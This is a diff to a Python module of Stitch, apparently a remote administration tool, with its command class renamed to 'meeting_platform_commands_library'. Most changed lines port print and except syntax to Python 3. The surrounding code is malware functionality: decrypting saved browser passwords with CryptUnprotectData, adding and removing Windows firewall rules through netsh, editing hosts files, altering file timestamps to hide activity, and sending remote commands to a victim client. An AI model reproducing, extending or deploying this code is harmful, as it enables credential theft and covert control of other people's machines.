@@ -2,8 +2,8 @@
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
-from meeting_platform_help import *
-from meeting_platform_utils import *
+from stitch_help import *
+from meeting_utils import *
 
 def st_recvall(client, count, aes_enc=None, encryption=True):
     buf = b''
@@ -43,7 +43,7 @@ def st_send(client, data, aes_enc):
 
 class meeting_platform_commands_library:
     __slots__= ['client', 'cli_target', 'cli_port', 'cli_os','cli_platform',
-                'cli_hostname', 'cli_user', 'cli_dwld', 'cli_temp',]
+                'cli_hostname', 'cli_user', 'cli_dwld', 'cli_temp']
 
     def __init__(self, client, target, port, aes_key, os, platform, hostname, user, dwld, temp):
         self.client = client
@@ -117,13 +117,13 @@ class meeting_platform_commands_library:
         response=self.receive()
         if no_error(response):
             response=self.receive()
-            print '\n{}'.format(response),
+            print('\n{}'.format(response), end='')
             while response != st_complete:
                 response=self.receive()
                 if response != st_complete:
-                    print '\b'+ response,
+                    print('\b'+ response, end='')
                 else:
-                    print "\n"
+                    print("\n")
                     break
         else:
             st_print(response)
@@ -262,7 +262,7 @@ class meeting_platform_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print('\n')
                 return
             if windows_client(self.cli_os):
                 cmd = 'netsh advfirewall firewall add rule name="NetBios Port {} {}" dir={} action=allow protocol={} localport={}'.format(port,direction,direction,proto,port)
@@ -281,7 +281,7 @@ class meeting_platform_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print('\n')
                 return
             if windows_client(self.cli_os):
                 cmd = 'netsh advfirewall firewall delete rule name="NetBios Port {} {}" protocol={} localport={}'.format(port, direction,proto,port)
@@ -298,7 +298,7 @@ class meeting_platform_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print('\n')
                 return
             self.pyexec('fwallow.py',pylib=True)
             self.send(prog)
@@ -349,7 +349,7 @@ class meeting_platform_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print('\n')
                 return
             self.pyexec('hostsupdate.py',pylib=True)
             self.send(hostname)
@@ -363,7 +363,7 @@ class meeting_platform_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print('\n')
                 return
             self.pyexec('hostsremove.py',pylib=True)
             self.send(hostname)
@@ -444,7 +444,7 @@ class meeting_platform_commands_library:
                 if correct.lower().startswith('y'):
                     break
         except KeyboardInterrupt:
-            print '\n'
+            print('\n')
             return
         self.pyexec('popup.py',pylib=True)
         self.send(message)
@@ -677,7 +677,7 @@ class meeting_platform_commands_library:
                             password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
                             if password:
                                 info_list += 'origin_url: {}\nusername: {}\npassword: {}\n\n'.format(information[0],information[1],str(password))
-                    except sqlite3.OperationalError, e:
+                    except sqlite3.OperationalError as e:
                             e = str(e)
                             connection.close()
                             os.remove(zip_loc)
@@ -715,7 +715,7 @@ class meeting_platform_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print('\n')
                 return
             self.pyexec('editAccessed.py',pylib=True)
             self.send(editfile)
@@ -734,7 +734,7 @@ class meeting_platform_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print('\n')
                 return
             self.pyexec('editCreation.py',pylib=True)
             self.send(editfile)
@@ -753,7 +753,7 @@ class meeting_platform_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print '\n'
+                print('\n')
                 return
             self.pyexec('editModified.py',pylib=True)
             self.send(editfile)
@@ -832,15 +832,15 @@ class meeting_platform_commands_library:
         try:
             ssh_host = raw_input("\nPlease enter ssh hostname: ")
             if 'exit' in ssh_host:
-                print '\n'
+                print('\n')
                 return
             ssh_user = raw_input("\nPlease enter ssh user: ")
             if 'exit' in ssh_user:
-                print '\n'
+                print('\n')
                 return
             ssh_pass = getpass("\nPlease enter password for {}: ".format(ssh_user))
         except KeyboardInterrupt:
-            print '\n'
+            print('\n')
             return
 
         self.pyexec('ssh.py',pylib=True)
